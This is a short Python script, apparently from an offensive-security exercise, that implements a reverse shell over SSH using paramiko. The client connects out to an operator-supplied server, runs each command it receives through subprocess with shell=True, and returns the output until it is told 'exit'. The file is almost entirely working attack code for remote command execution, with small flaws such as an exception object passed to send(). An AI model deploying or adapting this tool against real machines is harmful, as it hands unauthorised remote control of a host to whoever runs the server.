# Because of that Windows dont have an SSH server built-in, so we need to 
# reversing to send commands from an SSH server to SSH client

import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, cmd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    # Example of an transport session
    # <paramiko.Channel 0 (open) window=0 -> <paramiko.Transport at 0x9cc0e950 (cipher aes128-ctr, 128 bits) (active; 1 open channel(s))>>
    # Server is using AES counter mode with 128bit keys

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(cmd)                    # Send to server (bytes)
        print(ssh_session.recv(1024).decode())   # Print what received (Confirm message of server)
        while True:
            cmd = ssh_session.recv(1024)         # Get the request in the loop
            try:
                command = cmd.decode()            
                if command == 'exit':            # Close SSH client if get 'exit'
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(command),  # Do the command, get output
                                                    shell=True)
                ssh_session.send(cmd_output or 'okay')  # Sending the output to screen (or "okay" for not executable command) 
            except Exception as e:
                ssh_session.send(e)
        client.close()
    return

if __name__ == '__main__':
    import getpass
    user = input('Enter username: ')
    password = getpass.getpass()

    ip = input('Enter server IP ')
    port = int(input('Enter SSH port: '))  
    ssh_command(ip, port, user, password, 'ClientConnected')

